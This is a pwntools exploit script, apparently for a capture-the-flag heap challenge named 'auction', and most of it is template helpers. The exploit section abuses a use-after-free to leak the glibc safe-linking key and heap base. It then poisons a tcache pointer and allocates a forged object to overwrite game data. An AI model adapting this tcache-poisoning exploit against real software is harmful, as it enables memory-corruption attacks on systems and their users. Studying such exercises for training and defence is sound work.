#!/nix/store/60m4rxhg2fldqaak400c0lry96ijrzqn-python3-3.13.13/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ vagd template -e ./auction
from pwn import *

# context.terminal = ["zellij", "action", "new-pane", "-c", "--"]

context.terminal =  ["tmux", "splitw", "-h"]
GOFF = 0x555555554000  # GDB default base address
IP = ""  # remote IP
PORT = 0  # remote PORT
BINARY = "./auction"  # PATH to local binary
ARGS = []  # ARGS supplied to binary
ENV = {"LD_PRELOAD": "libc.so.6"}  # ENV supplied to binary
BOX = "ubuntu:noble"  # Docker box image

# GDB SCRIPT, executed at start of GDB session (e.g. set breakpoints here)
GDB = f"""
set follow-fork-mode parent

c"""

context.binary = exe = ELF(BINARY, checksec=False)  # binary
context.aslr = True  # ASLR enabled (only GDB)

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad = lambda x: u64(rpad(x))
cpad = lambda x, s: byt(x) + cyc(s)[len(byt(x)) :]
tob = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf = lambda elf=None: elf if elf else exe
srh = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh = lambda x: srh(x, libc)
lasm = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss = lambda x, s, t=None, *a, **kw: (
    sl(x, t, *a, **kw) if len(x) < s else se(x, *a, **kw) if len(x) == s else lerr(f"ss to big: {len(x):#x} > {s:#x}")
)
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(byt(x), byt(y), *a, **kw)
sa = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = lambda x, y, s, t=None, *a, **kw: (
    sla(x, y, t, *a, **kw)
    if len(y) < s
    else sa(x, y, *a, **kw)
    if len(y) == s
    else lerr(f"ss to big: {len(x):#x} > {s:#x}")
)
ra = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl = lambda t=None, *a, **kw: gt(t).close(*a, **kw)


# setup vagd vm
vm = None


def setup():
    global vm
    if args.REMOTE or args.LOCAL:
        return None

    try:
        # only load vagd if needed
        from vagd import Dogd, Qegd, Box
    except ModuleNotFoundError:
        log.error("Failed to import vagd, run LOCAL/REMOTE or install it")
    if not vm:
        vm = Dogd(BINARY, image=BOX, symbols=True, ex=True, fast=True)  # Docker
        # vm = Qegd(BINARY, img=Box.QEMU_UBUNTU, symbols=True, ex=True, fast=True)  # Qemu
    if vm.is_new:
        # additional setup here
        log.info("new vagd instance")

    return vm


# get target (pwnlib.tubes.tube)
def get_target(**kw):
    if args.REMOTE:
        # context.log_level = 'debug'
        return remote(IP, PORT)

    if args.LOCAL:
        if args.GDB:
            return gdb.debug([BINARY] + ARGS, env=ENV, gdbscript=GDB, **kw)
        return process([BINARY] + ARGS, env=ENV, **kw)

    return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)


def alloc(name, price):
    sla("Choice", "3")
    sla("Item name", name)
    sla("gold", price)
    sl("")


def free(slot):
    sla("Choice", "4")
    sla("slot", slot)
    sl("")


def leak(slot):
    sla("Choice", "5")
    sla("slot", slot)
    x = ru("Enter")
    sl("")
    return x


def edit(slot, x):
    sla("Choice", "6")
    sla("slot", slot)
    sla(b"name", x)
    sl("")


vm = setup()

# ===========================================================
#                   EXPLOIT STARTS HERE
# ===========================================================
# Arch:       amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Comment:    GCC: (GNU) 16.1.1 20260430

libc = ELF("./libc.so.6", checksec=False)

t = get_target()

sl("player")

alloc("hello", 100)
alloc("hello2", 100)

free(27)
free(28)

heap_mangled = upad(leak(28).split(b"Name")[1].split(b": ")[1][:8])

key = upad(leak(27).split(b"Name")[1].split(b": ")[1][:8])
lhex(key, "safe linking key")

heap_leak = (heap_mangled ^ key) - 3024
lhex(heap_leak, "heap base")

player_ptr = 2928 + heap_leak
edit(27, p64(player_ptr ^ key))

# for i in range(0, 7):
#     alloc("hello", 100)

# alloc("evil", 200)

# for i in range(27, 36):
#     free(i)

# free(36)
# lhex(exe.sym.flag_buf)

# edit(36, flat(exe.sym.flag_buf ^ key))

alloc("hello", 100)
alloc("hello", 100)
alloc(flat([cyc(0x20), 500]), 0xF4240)

sla("Choice", 2)
sla("slot", 26)


t.interactive()  # or it()
